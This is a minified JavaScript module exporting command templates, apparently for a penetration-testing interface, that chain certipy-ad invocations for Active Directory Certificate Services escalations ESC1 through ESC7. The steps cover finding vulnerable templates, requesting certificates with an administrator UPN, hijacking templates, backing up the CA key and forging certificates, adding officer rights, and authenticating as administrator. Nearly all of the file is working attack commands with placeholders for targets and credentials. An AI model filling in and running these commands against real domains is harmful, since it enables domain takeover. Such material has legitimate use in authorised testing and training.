const e=[{title:"ESC 1",description:"Enrollee-Supplied Subject for Client Authentication",template:`certipy-ad find -u {username} -p {password} -dc-ip {dc_ip}

certipy-ad req -u '{username}@{domain}' -p '{password}' -dc-ip {dc_ip} -target {domain} -ca {ca_name} -template {template_name} -upn {upn}

certipy-ad auth -pfx {pfx_file} -dc-ip {dc_ip}`},{title:"ESC 2",description:"Any Purpose Certificate Template",template:`certipy-ad find -u {username} -p {password} -dc-ip {dc_ip} -vulnerable -enabled

certipy-ad req -u '{username}' -p '{password}' -dc-ip '{dc_ip}' -target '{domain}' -ca '{ca_name}' -template 'Vulnerable-ESC2' -debug

certipy-ad req -u '{username}' -p '{password}' -dc-ip '{dc_ip}' -target '{domain}' -ca '{ca_name}' -template 'User' -on-behalf-of '{on_behalf_user}' -pfx {pfx_file} -debug

certipy-ad auth -pfx {pfx_file} -dc-ip {dc_ip}`},{title:"ESC 3",description:"Enrollment Agent Certificate Template",template:`certipy-ad find -u {username} -p {password} -dc-ip {dc_ip} -vulnerable -enabled

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerable-ESC3 -target {domain}

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template USER -target {domain} -on-behalf-of '{on_behalf_user}' -pfx {pfx_file}

certipy-ad auth -pfx {pfx_file}`},{title:"ESC 4",description:"Template Hijacking",template:`certipy-ad template -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerable-ESC4 -target {domain} -save-old

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerable-ESC4 -target {domain} -upn administrator@{domain}

certipy-ad template -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerble-ESC4 -target {domain} -configuration Vulnerble-ESC4.json

certipy-ad auth -pfx administrator.pfx`},{title:"ESC 5",description:"Vulnerable PKI Object Access Control",template:`certipy-ad ca -backup -u {username}@{domain} -p {password} -ca {ca_name} -target {dc_ip}

certipy-ad forge -ca-pfx '{ca_pfx_file}' -upn administrator@{domain}

certipy-ad auth -pfx administrator_forged.pfx -dc-ip {dc_ip}`},{title:"ESC 6",description:"CA Allows SAN Specification via Request Attributes",template:`certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template User -target {domain} -upn administrator@{domain}

certipy-ad auth -pfx administrator.pfx`},{title:"ESC 7",description:"Dangerous Permissions on CA",template:`certipy-ad find -u '{username}@{domain}' -p {password} -dc-ip {dc_ip} -vulnerable -enabled

certipy-ad ca -ca {ca_name} -add-officer {username} -u {username}@{domain} -p {password} -target {dc_ip} -dc-ip {dc_ip}

certipy-ad ca -ca {ca_name} -u {username}@{domain} -p {password} -target {dc_ip} -enable-template SubCA -dc-ip {dc_ip}

certipy-ad req -u {username}@{domain} -p {password} -ca {ca_name} -target {dc_ip} -template SubCA -upn administrator@{domain} -dc-ip {dc_ip}

certipy ca -u '{alt_username}@{alt_domain}' -p '{alt_password}' -ns '{alt_dc_ip}' -target '{alt_ca_target}' -ca '{alt_ca_name}' -issue-request '1'

certipy req -u '{alt_username}@{alt_domain}' -p '{alt_password}' -dc-ip '{alt_dc_ip}' -target '{alt_ca_target}' -ca '{alt_ca_name}' -retrieve '1'

certipy-ad auth -pfx administrator.pfx -dc-ip {dc_ip}`}],a={commands:e};export{e as commands,a as default};
